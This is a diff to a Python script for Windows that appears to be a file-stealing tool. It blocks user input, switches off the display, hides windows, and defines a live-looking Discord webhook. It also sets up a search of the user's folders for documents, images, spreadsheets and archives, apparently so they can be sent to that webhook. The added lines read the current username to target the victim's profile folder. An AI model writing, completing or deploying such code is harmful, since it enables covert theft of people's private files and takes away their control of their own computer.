@@ -5,6 +5,7 @@ import threading
 import ctypes
 import win32gui
 import win32con
+import getpass
 
 ctypes.windll.user32.BlockInput(True)
 ctypes.windll.user32.SendMessageW(0xFFFF, 0x112, 0xF170, 2)
@@ -21,10 +22,16 @@ for hwnd in windows:
         win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
         win32gui.SetWindowLong(hwnd, win32con.GWL_EXSTYLE, win32gui.GetWindowLong(hwnd, win32con.GWL_EXSTYLE) | win32con.WS_EX_TOOLWINDOW)
 
+user = getpass.getuser()
+
+path = "C:\\Users\\%s" % user
+
+
+
 # Replace with your Discord webhook URL
 WEBHOOK_URL = "https://discord.com/api/webhooks/1183011750610751539/5pbfhYiAne_g_NT1DXKX_m6wDxrwpsJvmYxP6YSUIkY6fflQS6YVsiJnGOcpmB3-kF9_"
 # Directories to ignore during file search
-BLACKLISTED_DIRS = ['C:\\Windows\\', 'C:\\Users\\USERPROFILE\\AppData\\', 'C:\\Users\\USERPROFILE\\OneDrive\\Documents\\', 'C:\\$SysReset\\', 'C:\\$WinREAgent\\', 'C:\\OneDriveTemp\\', 'C:\\PerfLogs\\', 'C:\\ProgramData\\', 'C:\\Program Files\\', 'C:\\Program Files (x86)\\', 'C:\\AMD\\']
+BLACKLISTED_DIRS = ['C:\\Windows\\', 'C:\\Users\\%s\\AppData\\', 'C:\\Users\\USERPROFILE\\OneDrive\\Documents\\', 'C:\\$SysReset\\', 'C:\\$WinREAgent\\', 'C:\\OneDriveTemp\\', 'C:\\PerfLogs\\', 'C:\\ProgramData\\', 'C:\\Program Files\\', 'C:\\Program Files (x86)\\', 'C:\\AMD\\']
 MAX_FILE_SIZE_MB = 8
 def check_file(file_path):
     allowed_extensions = ['.txt', '.pdf', '.png', '.jpg', '.jpeg', '.gif', '.mp4', '.mp3', '.py', '.docx', '.xls', '.xlsx', '.docx', '.wav', '.xlsm', '.zip', '.mpeg', '.csv']
